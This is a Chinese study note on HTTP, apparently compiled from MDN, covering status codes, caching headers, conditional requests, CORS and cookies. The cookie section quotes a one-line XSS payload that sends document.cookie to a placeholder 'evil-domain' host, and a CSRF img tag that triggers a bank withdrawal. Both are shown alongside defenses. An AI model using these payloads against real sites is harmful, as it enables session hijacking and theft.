# http 

超文本传输协议 **Hypertext Transfer Protocol**

无状态协议，服务器不会在两个请求之间保留任何数据（状态）

应用层

使用 Cookies 可以创建有状态的会话。

![Example of headers in an HTTP request](https://mdn.mozillademos.org/files/13821/HTTP_Request_Headers2.png)

![Example of headers in an HTTP response](https://mdn.mozillademos.org/files/13823/HTTP_Response_Headers2.png)

HTTP/2 引入了一个额外的步骤：它将 HTTP/1.x 消息分成帧并嵌入到流 (stream) 中。数据帧和报头帧分离，这将允许报头压缩。将多个流组合，这是一个被称为 *多路复用 (multiplexing)* 的过程，它允许更有效的底层 TCP 连接。

![HTTP/2 modify the HTTP message to divide them in frames (part of a single stream), allowing for more optimization.](https://mdn.mozillademos.org/files/13819/Binary_framing2.png)

HTTP 帧现在对 Web 开发人员是透明的。在 HTTP/2 中，这是一个在  HTTP/1.1 和底层传输协议之间附加的步骤。Web 开发人员不需要在其使用的 API 中做任何更改来利用 HTTP 帧；当浏览器和服务器都可用时，HTTP/2 将被打开并使用。

检测是否使用http/2：window.chrome.loadTimes()

在像 HTTP 这样的Client-Server（客户端-服务器）协议中，会话分为三个阶段：

1. 客户端建立一条 TCP 连接（如果传输层不是 TCP，也可以是其他适合的连接）。
2. 客户端发送请求并等待应答。
3. 服务器处理请求并送回应答，回应包括一个状态码和对应的数据。

从 HTTP/1.1 开始，连接在完成第三阶段后不再关闭，客户端可以再次发起新的请求。这意味着第二步和第三步可以连续进行数次。

## http 状态码

https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status

响应分为五类：

- 信息响应 100 101 102
- 成功响应 200 201 202 203 204 205 206 204 208 226
- 重定向 300 301 302 303 304 305 306 307 308
- 客户端错误 400 401 402 403 404 405 406 407 408 409 410 411 412 413 414 415 416 417 418 421422 423 424 426 428 429 431 451
- 服务器错误 500 501 502 503 504 505 506 507 508 510 511



HTTP `**302**` **Found** 重定向状态码表明请求的资源被暂时的移动到了由[`Location`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Location) 头部指定的 URL 上。浏览器会重定向到这个URL， 但是搜索引擎不会对该资源的链接进行更新

HTTP `**304**` **未改变**说明无需再次传输请求的内容，也就是说可以使用缓存的内容。这通常是在一些安全的方法（[safe](https://developer.mozilla.org/en-US/docs/Glossary/safe)），例如[`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) 或[`HEAD`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/HEAD) 或在请求中附带了头部信息： [`If-None-Match`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-None-Match)或[`If-Modified-Since`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Modified-Since)。

`**502**` **Bad Gateway** 是一种HTTP协议的服务器端错误状态代码，它表示作为网关或代理角色的服务器，从上游服务器（如tomcat、php-fpm）中接收到的响应是无效的。

## 连接管理

在 HTTP/1.x 里有好些个模型：*短连接*, *长连接*, 和 *HTTP 流水线。*

HTTP 的传输协议主要依赖于 TCP 来提供从客户端到服务器端之间的连接。

![Compares the performance of the three HTTP/1.x connection models: short-lived connections, persistent connections, and HTTP pipelining.](https://mdn.mozillademos.org/files/13727/HTTP1_x_Connections.png)

HTTP/2 新增了其它连接管理模型。

## CORS 

Cross-Origin Resource Sharing 跨域资源共享

### [Access-Control-Allow-Origin](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS#Access-Control-Allow-Origin)

origin 参数的值为源站 URI。它不包含任何路径信息，只是服务器名称。

注意，不管是否为跨域请求，ORIGIN 字段总是被发送。

## 缓存

缓存主要分为两大类：

- 私有缓存 private caches
- 共享缓存 shared caches

私有浏览器缓存 Private browser caches

共享代理缓存 Shared proxy caches

### 缓存控制

#### [The `Cache-control` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Caching#The_Cache-control_header)

### 缓存请求指令

客户端可以在HTTP请求中使用的标准 Cache-Control 指令。

```
Cache-Control: max-age=<seconds>
Cache-Control: max-stale[=<seconds>]
Cache-Control: min-fresh=<seconds>
Cache-control: no-cache 
Cache-control: no-store
Cache-control: no-transform
Cache-control: only-if-cached
```

### 缓存响应指令

服务器可以在响应中使用的标准 Cache-Control 指令。

```
Cache-control: must-revalidate
Cache-control: no-cache
Cache-control: no-store
Cache-control: no-transform
Cache-control: public
Cache-control: private
Cache-control: proxy-revalidate
Cache-Control: max-age=<seconds>
Cache-control: s-maxage=<seconds>
```



304：

当客户端发起一个请求时，缓存检索到已有一个对应的陈旧资源（缓存副本），则缓存会先将此请求附加一个`If-None-Match头，然后`发给目标服务器，以此来检查该资源副本是否是依然还是算新鲜的，若服务器返回了 [`304`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/304) (Not Modified)（该响应不会有带有实体信息），则表示此资源副本是新鲜的，这样一来，可以节省一些带宽。若服务器通过 If-None-Match 或 If-Modified-Since判断后发现已过期，那么会带有该资源的实体内容返回。

![Show how a proxy cache acts when a doc is not cache, in the cache and fresh, in the cache and stale.](https://mdn.mozillademos.org/files/13771/HTTPStaleness.png)

对于含有特定头信息的请求，会去计算缓存寿命。比如Cache-control: max-age=N的请求头，相应的缓存的寿命就是N。通常情况下，对于不含这个属性的请求则会去查看是否包含[Expires](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Expires)属性，通过比较Expires的值和头里面[Date](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Date)属性的值来判断是否缓存还有效。如果max-age和expires属性都没有，找找头里的[Last-Modified](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Last-Modified)信息。如果有，缓存的寿命就等于头里面Date的值减去Last-Modified的值除以10（注：根据rfc2626其实也就是乘以10%）。

缓存失效时间计算公式如下：

```
expirationTime = responseTime + freshnessLifetime - currentAge
```

上式中，`responseTime` 表示浏览器接收到此响应的那个时间点。

### *conditional requests* 条件请求

所有的条件头都会尝试检查服务器上存储的资源是否和特定的版本匹配。为了达到目的，条件请求需要指出资源的版本。相比于一个字节一个字节的比对，发送一个描述版本的值更加可取。这些值被称作 validators，有两种：

- 文档最后被修改的时间， the *last-modified* date
- 字符串，能够明确标记每个版本，称作  the *entity tag*，或者 etag

比较同一份资源的不同版本有一定的技巧性：取决于上下文环境的不同，有两种不同的等值检查（*equality checks*）类型：

- 强验证类型（*Strong validation*）应用于需要逐比特相对应的情况，例如需要进行断点续传的时候。
- 弱验证类型（*Weak validation*）应用于用户代理只需要确认资源内容相同即可。即便是有细微差别也可以接受，比如显示的广告不同，或者是页脚的时间不同。

验证类型与验证器的类型是相互独立的。 [`Last-Modified`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Last-Modified) 和 [`ETag`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/ETag) 首部均可应用于两种验证类型，尽管在服务器端实现的复杂程度可能会有所不同。HTTP 协议默认使用强验证类型，可以指定何时使用弱验证类型。

![The request issued when the cache is empty triggers the resource to be downloaded, with both validator value sent as headers. The cache is then filled.](https://mdn.mozillademos.org/files/13729/Cache1.png)

![With a stale cache, the conditional request is sent. The server can determine if the resource changed, and, as in this case, decide not to send it again as it is the same.](https://mdn.mozillademos.org/files/13731/HTTPCache2.png)





## 内容协商

![img](https://images2015.cnblogs.com/blog/718408/201607/718408-20160726110106247-288108702.png)

## Cookies

Cookie主要用于以下三个方面：

- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
- 个性化设置（如用户自定义设置、主题等）
- 浏览器行为跟踪（如跟踪分析用户行为等）

新的浏览器API已经允许开发者直接将数据存储到本地，如使用 [Web storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API) （本地存储和会话存储）或 [IndexedDB](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API) 。

### Cookie的作用域Section

`Domain` 和 `Path` 标识定义了Cookie的*作用域：*即Cookie应该发送给哪些URL。

`Domain` 标识指定了哪些主机可以接受Cookie。如果不指定，默认为[当前文档的主机](https://developer.mozilla.org/en-US/docs/Web/API/Document/location)（**不包含子域名**）。如果指定了`Domain`，则一般包含子域名。

例如，如果设置 `Domain=mozilla.org`，则Cookie也包含在子域名中（如`developer.mozilla.org`）。

`Path` 标识指定了主机下的哪些路径可以接受Cookie（该URL路径必须存在于请求URL中）。以字符 `%x2F` ("/") 作为路径分隔符，子路径也会被匹配。

例如，设置 `Path=/docs`，则以下地址都会匹配：

- `/docs`
- `/docs/Web/`
- `/docs/Web/HTTP`



通过[`Document.cookie`](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie)属性可创建新的Cookie，也可通过该属性访问非`HttpOnly`标记的Cookie。

```js
document.cookie = "yummy_cookie=choco"; 
document.cookie = "tasty_cookie=strawberry"; 
console.log(document.cookie); 
// logs "yummy_cookie=choco; tasty_cookie=strawberry"
```

### 会话劫持和XSS

在Web应用中，Cookie常用来标记用户或授权会话。因此，如果Web应用的Cookie被窃取，可能导致授权用户的会话受到攻击。常用的窃取Cookie的方法有利用社会工程学攻击和利用应用程序漏洞进行[XSS](https://developer.mozilla.org/en-US/docs/Glossary/XSS)攻击。

```js
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

`HttpOnly`类型的Cookie由于阻止了JavaScript对其的访问性而能在一定程度上缓解此类攻击。

### 跨站请求伪造（CSRF）

[维基百科](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery)已经给了一个比较好的[CSRF](https://developer.mozilla.org/en-US/docs/Glossary/CSRF)例子。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：

```html
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

当你打开含有了这张图片的HTML页面时，如果你之前已经登录了你的银行帐号并且Cookie仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：

- 对用户输入进行过滤来阻止[XSS](https://developer.mozilla.org/en-US/docs/Glossary/XSS)；
- 任何敏感操作都需要确认；
- 用于敏感信息的Cookie只能拥有较短的生命周期；
- 更多方法可以查看[OWASP CSRF prevention cheat sheet](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet)。



## 重定向

由于存在上述三种 URL 重定向机制，那么在多种方法同时设定的情况下，哪种方法会首先起作用呢？优先级顺序如下：

1. HTTP 协议的重定向机制永远最先触发，即便是在没有传送任何页面——也就没有页面被（客户端）读取——的情况下。
2. HTML 的重定向机制 ([``](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/meta)) 会在 HTTP 协议重定向机制未设置的情况下触发。
3. JavaScript 的重定向机制总是作为最后诉诸的手段，并且只有在客户端开启了 JavaScript 的情况下才起作用。

任何情况下，只要有可能，就应该采用 HTTP 协议的重定向机制，而不要使用  [``](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/meta) 标签。假如开发人员修改了 HTTP 重定向映射而忘记修改 HTML 页面的重定向映射，那么二者就会不一致，最终结果或者出现无限循环，或者导致其他噩梦的发生。



















